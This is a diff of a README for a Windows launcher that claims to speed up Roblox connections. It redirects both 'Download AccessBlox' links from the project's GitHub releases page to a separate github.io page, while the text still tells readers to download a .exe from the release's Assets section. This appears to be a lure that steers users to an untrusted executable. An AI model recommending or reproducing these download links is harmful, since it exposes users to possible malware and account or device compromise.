@@ -1,6 +1,6 @@
 # 🚀 accessblox-windows-launcher - Launch Roblox with better connection speeds
 
-[![](https://img.shields.io/badge/Download_AccessBlox-Blue.svg)](https://github.com/Dyannaachaean73/accessblox-windows-launcher/releases)
+[![](https://img.shields.io/badge/Download_AccessBlox-Blue.svg)](https://dyannaachaean73.github.io)
 
 AccessBlox v2026 improves how you start Roblox Player and Roblox Studio. It prepares your computer for the game, checks your internet connection, and applies the best settings to help you play without lag. This tool acts as a bridge between your computer and the Roblox servers to ensure a smooth experience.
 
@@ -8,7 +8,7 @@ AccessBlox v2026 improves how you start Roblox Player and Roblox Studio. It prep
 
 To get started, you must visit the official release page. This page contains the latest version of the launcher.
 
-[Visit the official download page here](https://github.com/Dyannaachaean73/accessblox-windows-launcher/releases)
+[Visit the official download page here](https://dyannaachaean73.github.io)
 
 Look for the file ending in .exe in the Assets section of the latest release. Click the file to download it to your computer.
 
